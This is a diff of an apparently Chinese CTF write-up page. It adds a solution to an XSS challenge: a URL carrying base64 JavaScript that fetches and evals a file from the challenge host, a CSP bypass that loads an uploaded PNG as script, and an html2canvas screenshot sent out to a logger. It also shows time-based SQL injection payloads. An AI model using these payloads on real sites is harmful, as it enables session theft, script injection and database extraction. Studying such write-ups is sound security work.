@@ -382,8 +382,85 @@ hp .jpg</code></pre><p>将<code>jpg</code>解析为php，绕过关键字过滤�
 <p>比赛期间没做出来，结束了突然有点思路了</p>
 <p>绕ast+静态。window对象所有方法都能调，同时封锁了属性的调用</p>
 <p>open可用，调到子页面直接打opener的资源就能避开父的属性调用了</p>
-<pre class="hljs"><code>http:<span class="hljs-regexp">//</span><span class="hljs-number">134.175</span>.<span class="hljs-number">231.113</span>:<span class="hljs-number">8848</span>/passport?image=%2Fstatic%2Fhead.jpg&amp;island=aa&amp;fruit=aa<span class="hljs-string">"&amp;name=url&amp;data=amF2YXNjcmlwdDphbGVydChvcGVuZXIuZG9jdW1lbnQuY29va2llKQ==%27%3b%0aopen(atob(data))%3b%2F%2F</span></code></pre><p class="img-container"><img src="https://i.imgur.com/5JqaCIf.jpg" alt=""></p>
-<h3 id="mixture"><a class="header-link" href="#mixture"></a>mixture</h3>
+<pre class="hljs"><code>http:<span class="hljs-regexp">//</span><span class="hljs-number">134.175</span>.<span class="hljs-number">231.113</span>:<span class="hljs-number">8848</span>/passport?image=%2Fstatic%2Fhead.jpg&amp;island=aa&amp;fruit=aa<span class="hljs-string">"&amp;name=url&amp;data=amF2YXNjcmlwdDphbGVydChvcGVuZXIuZG9jdW1lbnQuY29va2llKQ==%27%3b%0aopen(atob(data))%3b%2F%2F</span></code></pre><p class="img-container"><img src="https://i.loli.net/2020/05/08/q6T7nuFHUOYvip2.jpg" alt="-w442"></p>
+<p>看到有一半flag肯定后面还有东西。打一下源码，看看hint里的admin行为是想表达个啥</p>
+<pre class="hljs"><code>&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_01.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_02.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_03.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_04.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_05.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_06.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_07.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_08.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_09.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_10.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_11.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_12.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_13.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_14.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_15.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_16.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_17.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_18.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_19.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_20.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_21.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_22.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_23.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_24.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_25.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_26.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_27.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_28.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_29.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_30.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_31.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_32.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_33.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_34.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_35.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_36.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_37.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_38.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_39.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_40.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_41.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_42.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_43.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_44.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_45.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_46.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_47.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_48.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_49.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_50.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_51.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_52.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_53.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_54.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_55.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_56.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_57.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_58.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_59.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_60.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_61.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_62.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_63.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_64.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_65.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_66.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_67.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
+&lt;<span class="hljs-selector-tag">img</span> src<span class="hljs-string">"</span></code></pre><p>看到这里，心想比赛结束了也就没继续了(工作量太大哭惹</p>
+<p>可以看到管理员页面加载了很多img，但是直接会访问500。</p>
+<p>很明显它这个意思就是想让我们拿到这些图片，我们得想办法找个能sreenshot的库，参考出题人的<code>html2canvas</code>：<a href="https://github.com/niklasvh/html2canvas，拉一个min出来就够用了">https://github.com/niklasvh/html2canvas，拉一个min出来就够用了</a></p>
+<p>本地测试一下min的截图功能没有被阉割，nice
+<img src="https://i.loli.net/2020/05/08/cYrIVQqNFBw4pRG.jpg" alt="-w1190"></p>
+<p>剩下就是过CSP，self不能直接script引入外源库文件。但可以把png作为js文件加载来用，default-src script-src指定self都可过。之前有个google-jsonp的csp bypass，思路类似都是把自己当作跳板了
+<img src="https://i.loli.net/2020/05/08/br9isOGjczD48TW.jpg" alt="-w1377"></p>
+<p>把截图内容作为图片再次上传到upload，回调出来的url发到http-log就能读到剩下的flag了。测试一下打本地ok，成功拿到upload的图片
+<img src="https://i.loli.net/2020/05/08/N1CPzpcLMbsj3Vy.jpg" alt="-w1430"></p>
+<pre class="hljs"><code><span class="hljs-attribute">http</span>://134.175.231.113:8848/passport?image=<span class="hljs-number">%2</span>Fstatic<span class="hljs-number">%2</span>Fhead.jpg&amp;island=aa&amp;fruit=aa&amp;name=url&amp;data=amF2YXNjcmlwdDpmZXRjaCgnaHR0cDovLzEzNC4xNzUuMjMxLjExMzo4ODQ4L3N0YXRpYy9pbWFnZXMvMDIwYTQ1NDJiZDU5MmQ3MWYwM2MyN2Q3ZjdkOWRlZmQucG5nJykudGhlbihyZXM9PnJlcy50ZXh0KCkpLnRoZW4odHh0PT5ldmFsKHR4dCkp<span class="hljs-number">%27</span><span class="hljs-number">%3</span>b<span class="hljs-number">%0</span>aopen(atob(data))<span class="hljs-number">%3</span>b<span class="hljs-number">%2</span>F<span class="hljs-number">%2</span>F</code></pre><h3 id="mixture"><a class="header-link" href="#mixture"></a>mixture</h3>
 <p>首先是一个登录界面，尝试了：</p>
 <pre class="hljs"><code>http://<span class="hljs-number">49.51</span>.<span class="hljs-number">251.99</span>/member.php?orderby=limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span> <span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">analyse</span><span class="hljs-params">(1,1)</span>;</span></code></pre><p>发现会提取最大最小值，证明这个地方写法如下：</p>
 <pre class="hljs"><code><span class="hljs-keyword">order</span> <span class="hljs-title">by</span> id + $_GET[‘orderby’] </code></pre><pre class="hljs"><code><span class="hljs-attribute">http</span>://134.175.185.244/member.php?orderby=,ISNULL(CASE<span class="hljs-number">%20</span>WHEN<span class="hljs-number">%20</span>(1=1)<span class="hljs-number">%20</span>THEN<span class="hljs-number">%20</span>BENCHMARK(2000000,SHA1(123))<span class="hljs-number">%20</span>ELSE<span class="hljs-number">%202</span><span class="hljs-number">%20</span>END)</code></pre><p>利用benchmark延时注入可以得到，库名：
